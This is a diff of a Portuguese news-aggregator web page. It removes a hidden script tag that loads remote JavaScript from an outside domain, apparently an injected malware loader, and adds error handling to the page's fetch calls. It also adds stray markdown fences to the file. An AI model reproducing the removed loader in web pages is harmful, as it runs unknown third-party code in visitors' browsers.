@@ -1,14 +1,7 @@
+```html
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-<script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrld.ltd/NTEwNjA1.js?t=510605';
-      document.head.appendChild(script);
-  })();
-</script>
 <meta name="google-site-verification" content="VmGN_6lB30wphsQ4v-vTdsv3Wyax4XMeylYzYD5EHHQ" />
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -27,7 +20,7 @@ body.light {
 }
 body {
   margin: 0;
-  font-family: Arial;
+  font-family: Arial, sans-serif;
   background: var(--bg);
   color: var(--text);
 }
@@ -76,7 +69,7 @@ h2 { margin-top: 40px; }
 <header>
 <h1 id="title">🌐 Notícias Mais Pesquisadas no Mundo</h1>
 <p id="updateDate"></p>
-<p><span id="visitorText">Visitantes:</span> <span id="visitorCount">0</span></p>
+<p><span id="visitorText">Visitantes:</span> <span id="visitorCount">...</span></p>
 
 <button onclick="toggleLanguage()">🌍 PT / EN</button>
 <button onclick="toggleTheme()">🌙 Tema</button>
@@ -108,10 +101,22 @@ const topics = [
 
 // CONTADOR DE VISITAS
 async function updateVisitorCount() {
-  const res = await fetch("https://api.countapi.xyz/hit/site-noticias/visitas");
-  const data = await res.json();
-  document.getElementById("visitorCount").innerText = data.value;
+  try {
+    const response = await fetch("https://api.countapi.xyz/hit/jmar-tech-news-site/visitas");
+
+    if (!response.ok) {
+      throw new Error("Erro ao contactar API");
+    }
+
+    const data = await response.json();
+    document.getElementById("visitorCount").innerText = data.value;
+
+  } catch (error) {
+    console.error("Erro no contador:", error);
+    document.getElementById("visitorCount").innerText = "Indisponível";
+  }
 }
+
 updateVisitorCount();
 
 // TRADUÇÃO
@@ -141,26 +146,34 @@ async function loadAllNews() {
   container.innerHTML = "";
 
   for (let topic of topics) {
-    const res = await fetch("https://api.spaceflightnewsapi.net/v4/articles/?search=" + topic.search);
-    const data = await res.json();
+    try {
+      const res = await fetch(
+        "https://api.spaceflightnewsapi.net/v4/articles/?search=" + topic.search
+      );
+      const data = await res.json();
 
-    let title = lang === "pt" ? topic.pt : topic.en;
+      let title = lang === "pt" ? topic.pt : topic.en;
 
-    let section = `<h2>${title}</h2><div class="grid">`;
+      let section = `<h2>${title}</h2><div class="grid">`;
 
-    data.results.slice(0, 4).forEach(a => {
-      section += `
-        <div class="card">
-          <img src="${a.image_url}">
-          <h3>${a.title}</h3>
-          <p>${a.summary}</p>
-          <a href="${a.url}" target="_blank">Read more</a>
-        </div>
-      `;
-    });
+      data.results.slice(0, 4).forEach(a => {
+        section += `
+          <div class="card">
+            <img src="${a.image_url}" alt="${a.title}" loading="lazy"
+                 onerror="this.style.display='none'">
+            <h3>${a.title}</h3>
+            <p>${a.summary}</p>
+            <a href="${a.url}" target="_blank" rel="noopener noreferrer">Read more</a>
+          </div>
+        `;
+      });
 
-    section += "</div>";
-    container.innerHTML += section;
+      section += "</div>";
+      container.innerHTML += section;
+
+    } catch (err) {
+      console.error("Erro ao carregar notícias:", err);
+    }
   }
 
   document.getElementById("updateDate").innerText =
@@ -177,6 +190,17 @@ setInterval(loadAllNews, 86400000);
 
 </body>
 </html>
+```
+
+
+
+
+
+
+
+ 
+
+ 
 
 
  
@@ -238,7 +262,6 @@ setInterval(loadAllNews, 86400000);
  
 
  
-
 
 
 
